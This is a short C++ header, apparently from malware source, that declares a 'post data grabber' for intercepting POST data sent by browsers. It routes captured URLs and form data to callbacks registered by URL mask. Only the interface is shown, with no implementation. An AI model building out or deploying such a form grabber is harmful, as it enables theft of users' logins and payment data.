//Граббер поста данных отсылаемых браузерами

#ifndef PostDataGrabberH
#define PostDataGrabberH

namespace PostDataGrabber
{
	struct ParamEvent
	{
		const char* url; 
		const char* data; //данные пост запроса
	};

	typedef void (*TypeFuncReceiver)( ParamEvent& ); //тип функции которой будем передавать управление

	struct Receiver
	{
		char* urlMask; //на какой урл реагировать
		TypeFuncReceiver FuncReceiver; //функция получатель события
	};

	bool Init();
	void Release();

	Receiver* AddReceiver( const char* urlMask, TypeFuncReceiver FuncReceiver );
	void DelReceiver( Receiver* receiver );

	void DoEvents( const char* url, const char* postData ); //вызов события
}

#endif //PostDataGrabberH
